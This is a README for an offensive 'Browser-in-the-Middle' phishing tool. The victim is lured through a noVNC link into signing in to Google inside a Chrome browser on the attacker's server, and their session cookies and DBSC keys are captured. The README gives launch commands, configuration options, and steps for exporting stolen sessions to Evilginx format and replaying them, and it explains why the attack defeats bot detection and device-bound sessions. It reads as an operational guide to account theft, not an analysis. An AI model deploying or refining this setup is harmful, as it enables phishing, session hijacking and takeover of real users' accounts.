# Browser-in-the-Middle (BitM) -- Chrome + noVNC

Captures Google session cookies (and DBSC keys) by having the victim interact with a real Chrome browser running on the attacker's server, streamed via noVNC.

## Why this works

Unlike a proxy-based AiTM (Evilginx), the victim's keystrokes go into a **real Chrome** visiting the **real** `accounts.google.com`. Every client-side check passes because there is nothing to detect:

| Check | Evilginx (proxy) | BitM (this tool) |
|---|---|---|
| `navigator.webdriver` | N/A (proxy, no browser) | `false` (native Chrome) |
| BotGuard `window.location.origin` | `accounts.<phishing-domain>` -- blocked | `accounts.google.com` -- valid |
| DBSC binding | Victim's TPM -- cookie unusable | **Attacker's server** -- cookie usable |

Chrome is launched directly via `subprocess`, not via Playwright. Playwright is only connected **after** authentication to extract cookies through `connect_over_cdp()`.

## Architecture

```
Victim --[HTTPS/WSS]--> Caddy --> websockify --> x11vnc --> Xvfb --> Chrome
       video stream +                                                  |
       keyboard/mouse                                           accounts.google.com
```

## Prerequisites

- Linux VPS with a public IP
- Domain name + TLS reverse proxy (Caddy recommended) in front of websockify
- Run `sudo bash setup.sh` once to install all dependencies

## Quick start

```bash
# Install (once)
sudo bash setup.sh

# Launch
python3 bitm_server.py

# With system Chrome (required for DBSC support)
python3 bitm_server.py --chrome-path /usr/bin/google-chrome-stable
```

The script prints a noVNC lure URL to send to the victim. Once they
authenticate, cookies are extracted automatically and saved to `sessions/`.

## Options

```
--target-url URL        Initial URL loaded in Chrome (default: Google login)
--chrome-path PATH      Path to a Chrome/Chromium binary
--display N             Xvfb display number (default: 99)
--vnc-port PORT         x11vnc port (default: 5999)
--ws-port PORT          websockify/noVNC port (default: 6080)
--cdp-port PORT         Chrome DevTools Protocol port (default: 9222)
--width W               Browser width (default: 1280)
--height H              Browser height (default: 900)
--novnc-dir DIR         noVNC installation directory (default: /opt/noVNC)
--output-dir DIR        Output directory (default: ./sessions)
--user-data-dir DIR     Chrome profile directory (default: sessions/chrome_profile)
--redirect-url URL      Redirect victim after capture (default: https://mail.google.com)
--timeout SECS          Timeout in seconds (default: 600)
```

## Post-capture

```bash
# Show captured cookies
python3 extract_session.py sessions/bitm_session_*.json

# Export to Evilginx format (for replay_evilginx.py)
python3 extract_session.py sessions/bitm_session_*.json --mode export

# Relaunch Chrome with the captured profile (DBSC keys intact)
python3 extract_session.py sessions/bitm_session_*.json --mode replay
# or directly:
google-chrome --user-data-dir=sessions/chrome_profile
```

## DBSC bypass

When Chrome runs on the attacker's server, the DBSC key pair is generated and stored **on that server**. The session cookie is bound to the server's keys, not the victim's TPM. The attacker owns both the cookie and the private key, so the session remains valid.

Requirements for DBSC:
- Use system Chrome >= 127 (`--chrome-path /usr/bin/google-chrome-stable`)
- Playwright's bundled Chromium may not have DBSC flags enabled

## Files

| File | Role |
|---|---|
| `bitm_server.py` | Main orchestrator: Xvfb + x11vnc + websockify + Chrome, login monitoring, cookie extraction |
| `extract_session.py` | Show, export (Evilginx format), or replay captured sessions |
| `setup.sh` | One-shot dependency installation on Debian/Ubuntu |
| `requirements.txt` | Python dependencies |
